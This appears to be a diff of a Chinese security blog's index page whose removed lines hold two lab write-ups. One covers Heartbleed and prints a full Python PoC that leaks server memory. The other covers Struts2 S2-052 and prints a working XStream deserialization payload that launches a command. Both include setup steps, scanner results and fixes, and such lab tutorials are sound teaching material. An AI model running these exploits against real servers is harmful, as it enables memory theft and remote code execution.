-<p>（6）重启apache，然后通过宿主机访问虚拟机ip，发现被自动定向到443端口:<br><img src="http://oo3iot5oz.bkt.clouddn.com/heardbleed/heartbleed04.png" alt="">  </p>
-<p>ps：<br>apache启动方法：<br>在apache安装路径/usr/local/httpd/bin  中输入./apachectl start启动apache</p>
-<p>此时，环境搭建完毕。  </p>
-<h2 id="0x06-使用poc攻击"><a href="#0x06-使用poc攻击" class="headerlink" title="0x06 使用poc攻击"></a>0x06 使用poc攻击</h2><p>用nmap -sV localhost –script=ssl-heartbleed测试漏洞环境  </p>
-<p>结果如下，发现心脏出血漏洞：</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/heardbleed/heartbleed05.png" alt="">  </p>
-<p>然后利用poc进行攻击<br>网上查到的python版poc：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">执行命令如： python heartbleed.py <span class="number">192.168</span><span class="number">.152</span><span class="number">.132</span> -p <span class="number">443</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line">options = OptionParser(usage=<span class="string">'%prog server [options]'</span>, description=<span class="string">'Test for SSL heartbeat vulnerability (CVE-2014-0160)'</span>)</span><br><span class="line">options.add_option(<span class="string">'-p'</span>, <span class="string">'--port'</span>, type=<span class="string">'int'</span>, default=<span class="number">443</span>, help=<span class="string">'TCP port to test (default: 443)'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">h2bin</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x.replace(<span class="string">' '</span>, <span class="string">''</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">hello = h2bin(<span class="string">'''</span></span><br><span class="line"><span class="string">16 03 02 00  dc 01 00 00 d8 03 02 53</span></span><br><span class="line"><span class="string">43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf</span></span><br><span class="line"><span class="string">bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00</span></span><br><span class="line"><span class="string">00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88</span></span><br><span class="line"><span class="string">00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c</span></span><br><span class="line"><span class="string">c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09</span></span><br><span class="line"><span class="string">c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44</span></span><br><span class="line"><span class="string">c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c</span></span><br><span class="line"><span class="string">c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11</span></span><br><span class="line"><span class="string">00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04</span></span><br><span class="line"><span class="string">03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19</span></span><br><span class="line"><span class="string">00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08</span></span><br><span class="line"><span class="string">00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13</span></span><br><span class="line"><span class="string">00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00</span></span><br><span class="line"><span class="string">00 0f 00 01 01                                  </span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line">hb = h2bin(<span class="string">''' </span></span><br><span class="line"><span class="string">18 03 02 00 03</span></span><br><span class="line"><span class="string">01 40 00</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexdump</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> xrange(<span class="number">0</span>, len(s), <span class="number">16</span>):</span><br><span class="line">        lin = [c <span class="keyword">for</span> c <span class="keyword">in</span> s[b : b + <span class="number">16</span>]]</span><br><span class="line">        hxdat = <span class="string">' '</span>.join(<span class="string">'%02X'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> lin)</span><br><span class="line">        pdat = <span class="string">''</span>.join((c <span class="keyword">if</span> <span class="number">32</span> &lt;= ord(c) &lt;= <span class="number">126</span> <span class="keyword">else</span> <span class="string">'.'</span> )<span class="keyword">for</span> c <span class="keyword">in</span> lin)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'  %04x: %-48s %s'</span> % (b, hxdat, pdat)</span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvall</span><span class="params">(s, length, timeout=<span class="number">5</span>)</span>:</span></span><br><span class="line">    endtime = time.time() + timeout</span><br><span class="line">    rdata = <span class="string">''</span></span><br><span class="line">    remain = length</span><br><span class="line">    <span class="keyword">while</span> remain &gt; <span class="number">0</span>:</span><br><span class="line">        rtime = endtime - time.time() </span><br><span class="line">        <span class="keyword">if</span> rtime &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        r, w, e = select.select([s], [], [], <span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> s <span class="keyword">in</span> r:</span><br><span class="line">            data = s.recv(remain)</span><br><span class="line">            <span class="comment"># EOF?</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">            rdata += data</span><br><span class="line">            remain -= len(data)</span><br><span class="line">    <span class="keyword">return</span> rdata</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvmsg</span><span class="params">(s)</span>:</span></span><br><span class="line">    hdr = recvall(s, <span class="number">5</span>)</span><br><span class="line">    <span class="keyword">if</span> hdr <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Unexpected EOF receiving record header - server closed connection'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span></span><br><span class="line">    typ, ver, ln = struct.unpack(<span class="string">'&gt;BHH'</span>, hdr)</span><br><span class="line">    pay = recvall(s, ln, <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> pay <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Unexpected EOF receiving record payload - server closed connection'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">' ... received message: type = %d, ver = %04x, length = %d'</span> % (typ, ver, len(pay))</span><br><span class="line">    <span class="keyword">return</span> typ, ver, pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hit_hb</span><span class="params">(s)</span>:</span></span><br><span class="line">    s.send(hb)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        typ, ver, pay = recvmsg(s)</span><br><span class="line">        <span class="keyword">if</span> typ <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'No heartbeat response received, server likely not vulnerable'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> typ == <span class="number">24</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Received heartbeat response:'</span></span><br><span class="line">            hexdump(pay)</span><br><span class="line">            <span class="keyword">if</span> len(pay) &gt; <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'WARNING: server returned more data than it should - server is vulnerable!'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Server processed malformed heartbeat, but did not return any extra data.'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> typ == <span class="number">21</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Received alert:'</span></span><br><span class="line">            hexdump(pay)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Server returned error, likely not vulnerable'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    opts, args = options.parse_args()</span><br><span class="line">    <span class="keyword">if</span> len(args) &lt; <span class="number">1</span>:</span><br><span class="line">        options.print_help()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Connecting...'</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.connect((args[<span class="number">0</span>], opts.port))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Sending Client Hello...'</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.send(hello)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Waiting for Server Hello...'</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        typ, ver, pay = recvmsg(s)</span><br><span class="line">        <span class="keyword">if</span> typ == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Server closed connection without sending Server Hello.'</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment"># Look for server hello done message.</span></span><br><span class="line">        <span class="keyword">if</span> typ == <span class="number">22</span> <span class="keyword">and</span> ord(pay[<span class="number">0</span>]) == <span class="number">0x0E</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Sending heartbeat request...'</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.send(hb)</span><br><span class="line">    hit_hb(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
-<p>进行攻击，成功获得内存的数据  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/heardbleed/heartbleed06.png" alt="">  </p>
-<p>通过wireshark抓包，我们发现Heartbeat Response回复了大约16kb的内存数据。  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/heardbleed/heartbleed07.png" alt=""></p>
-<h2 id="0x07-使用openvas对该存在漏洞的系统扫描"><a href="#0x07-使用openvas对该存在漏洞的系统扫描" class="headerlink" title="0x07 使用openvas对该存在漏洞的系统扫描"></a>0x07 使用openvas对该存在漏洞的系统扫描</h2><p>结果如下：<br><img src="http://oo3iot5oz.bkt.clouddn.com/heardbleed/heartbleed08.png" alt=""><br><img src="http://oo3iot5oz.bkt.clouddn.com/heardbleed/heartbleed09.png" alt="">  </p>
-<h2 id="0x08-应对方案"><a href="#0x08-应对方案" class="headerlink" title="0x08 应对方案"></a>0x08 应对方案</h2><p>升级openssl版本</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/22/struts2-052漏洞/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/01/22/struts2-052漏洞/" itemprop="url">
-                  struts2-052漏洞
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-22T21:39:50+08:00">
-                2018-01-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/01/22/struts2-052漏洞/" class="leancloud_visitors" data-flag-title="struts2-052漏洞">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-struts2"><a href="#0x00-struts2" class="headerlink" title="0x00 struts2"></a>0x00 struts2</h2><p>struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。  </p>
-<h2 id="0x01-struts2-052漏洞"><a href="#0x01-struts2-052漏洞" class="headerlink" title="0x01 struts2-052漏洞"></a>0x01 struts2-052漏洞</h2><p>struts2-052漏洞触发点是REST插件在解析请求中的xml文件时，调用了XStreamHandler，传入的数据会被默认进行反序列化，如果当传入的xml是个经过XStream序列化的恶意对象时，便造成反序列化漏洞，构成远程代码执行。  </p>
-<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>这次漏洞使用windows系统做测试对象。  </p>
-<p>下载java并配置环境:  </p>
-<ul>
-<li><p>在java官网下载java1.8  </p>
-</li>
-<li><p>然后添加到windows环境变量<br><img src="http://oo3iot5oz.bkt.clouddn.com/struts2-52/struts1.png" alt="">  </p>
-</li>
-</ul>
-<p>下载tomcat并配置环境：  </p>
-<ul>
-<li>在tomcat官网下载tomcat并解压  </li>
-<li>然后添加到windows环境变量  </li>
-</ul>
-<p>下载存在漏洞的struts2框架版本：  </p>
-<p>在 <a href="http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip" target="_blank" rel="noopener">http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip</a> 下载漏洞影响的最后版本2.5.12<br>解压后将struts2-rest-showcase.war复制到tomcat的webapps的目录下  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/struts2-52/struts2.png" alt="">  </p>
-<p>更改/tomcat/conf中的server.xml，默认是8080，如果冲突我们可以将端口号更改到空闲端口，这里改到了12345  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/struts2-52/struts3.png" alt="">  </p>
-<p>打开/tomcat/bin中的startup.bat，并通过浏览器访问页面。  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/struts2-52/struts4.png" alt="">  </p>
-<h2 id="0x03-payload生成"><a href="#0x03-payload生成" class="headerlink" title="0x03 payload生成"></a>0x03 payload生成</h2><p>若本机拥有git环境，则使用<br>git clone <a href="https://github.com/mbechler/marshalsec.git" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec.git</a><br>然后参考 <a href="https://github.com/mbechler/marshalsec.git" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec.git</a> 中的使用方法<br>来生成payload<br>如果没有，可以在网络中查找一段windows的payload，并将此段代码中command标签中的内容更改成想在cmd中执行的命令，这里使用了calc</p>
-<pre><code>&lt;map&gt;
-  &lt;entry&gt;
-    &lt;jdk.nashorn.internal.objects.NativeString&gt;
-      &lt;flags&gt;0&lt;/flags&gt;
-      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;
-        &lt;dataHandler&gt;
-          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;
-            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;
-              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;
-                &lt;initialized&gt;false&lt;/initialized&gt;
-                &lt;opmode&gt;0&lt;/opmode&gt;
-                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
-                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
-                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;
-                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;
-                      &lt;command&gt;
-                        &lt;string&gt;calc&lt;/string&gt;
-                      &lt;/command&gt;
-                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
-                    &lt;/next&gt;
-                  &lt;/iter&gt;
-                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;
-                    &lt;method&gt;
-                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;
-                      &lt;name&gt;start&lt;/name&gt;
-                      &lt;parameter-types/&gt;
-                    &lt;/method&gt;
-                    &lt;name&gt;foo&lt;/name&gt;
-                  &lt;/filter&gt;
-                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;
-                &lt;/serviceIterator&gt;
-                &lt;lock/&gt;
-              &lt;/cipher&gt;
-              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;
-              &lt;ibuffer&gt;&lt;/ibuffer&gt;
-              &lt;done&gt;false&lt;/done&gt;
-              &lt;ostart&gt;0&lt;/ostart&gt;
-              &lt;ofinish&gt;0&lt;/ofinish&gt;
-              &lt;closed&gt;false&lt;/closed&gt;
-            &lt;/is&gt;
-            &lt;consumed&gt;false&lt;/consumed&gt;
-          &lt;/dataSource&gt;
-          &lt;transferFlavors/&gt;
-        &lt;/dataHandler&gt;
-        &lt;dataLen&gt;0&lt;/dataLen&gt;
-      &lt;/value&gt;
-    &lt;/jdk.nashorn.internal.objects.NativeString&gt;
-    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;
-  &lt;/entry&gt;
-  &lt;entry&gt;
-    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
-    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
-  &lt;/entry&gt;
-&lt;/map&gt;
-</code></pre><p>具体构造命令时，某些字符无法直接输入，关于这部分的构造方法在 <a href="http://www.freebuf.com/vuls/147017.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/147017.html</a>  </p>
-<h2 id="0x04-使用burpsuite进行截包重发"><a href="#0x04-使用burpsuite进行截包重发" class="headerlink" title="0x04 使用burpsuite进行截包重发"></a>0x04 使用burpsuite进行截包重发</h2><p>将burpsuite中的监听设置成127.0.0.1:8082  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/struts2-52/struts5.png" alt="">  </p>
-<p>将浏览器的代理设置成手动代理，ip和端口号与burpsuite中设置相同  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/struts2-52/struts6.png" alt="">  </p>
-<p>然后用浏览器访问 <a href="http://localhost:12345/struts2-rest-showcase" target="_blank" rel="noopener">http://localhost:12345/struts2-rest-showcase</a>  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/struts2-52/struts7.png" alt="">  </p>
-<p>然后利用brupsuite截断一次提交的数据  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/struts2-52/struts8.png" alt="">  </p>
-<p>将content-type改成application/xml，将body部分数据改为之前写好的payload  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/struts2-52/struts9.png" alt="">  </p>
-<p>然后提交，成功弹出本机计算器  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/struts2-52/struts10.png" alt="">  </p>
-<h2 id="0x05-使用openvas对该存在漏洞的系统进行扫描"><a href="#0x05-使用openvas对该存在漏洞的系统进行扫描" class="headerlink" title="0x05 使用openvas对该存在漏洞的系统进行扫描"></a>0x05 使用openvas对该存在漏洞的系统进行扫描</h2><p>扫描结果如下:  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/struts2-52/struts11.png" alt="">  </p>
-<h2 id="0x06-危害"><a href="#0x06-危害" class="headerlink" title="0x06 危害"></a>0x06 危害</h2><p>入侵者可以直接通过提交数据包对服务器进行操作，可以远程执行代码随意查看服务器内容，还可以通过命令写入木马、创建用户、留下后门。  </p>
-<h2 id="0x07-应对方案"><a href="#0x07-应对方案" class="headerlink" title="0x07 应对方案"></a>0x07 应对方案</h2><ul>
-<li>升级Struts到2.5.13最新版本</li>
-<li>在不使用时删除Struts REST插件</li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2467,7 +2385,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">61</span>
+                <span class="site-state-item-count">63</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2478,7 +2396,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">17</span>
+                <span class="site-state-item-count">18</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -2489,7 +2407,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">51</span>
+                <span class="site-state-item-count">52</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
